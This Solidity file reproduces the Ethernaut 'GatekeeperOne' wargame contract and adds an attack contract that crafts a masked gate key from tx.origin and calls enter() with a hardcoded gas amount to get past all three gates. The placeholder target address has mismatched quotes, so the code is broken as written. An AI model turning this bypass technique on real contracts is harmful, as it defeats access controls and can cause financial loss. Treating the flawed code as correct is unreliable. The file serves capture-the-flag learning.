pragma solidity ^0.4.18;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(msg.gas % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint32(_gateKey) == uint16(_gateKey));
    require(uint32(_gateKey) != uint64(_gateKey));
    require(uint32(_gateKey) == uint16(tx.origin));
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Gatekeeperhack {
    address public _gateKey = tx.origin;
    bytes8 public _gateKey8 = bytes8(_gateKey);
    // Mask to build the right _gateKey parameter for gateThree modifier
    bytes8 public mask = 0xFFFFFFFF0000FFFF;

    bytes8 public _gateKey8Padded = _gateKey8 & mask; 

    GatekeeperOne target = GatekeeperOne('COPY YOUR ETHERNAUT INSTANCE ADDRESS TO BE HACKED HERE");

    function hack(){
        target.call.gas(32979)(bytes4(sha3("enter(bytes8)")),_gateKey8Padded);

    }

   
}

   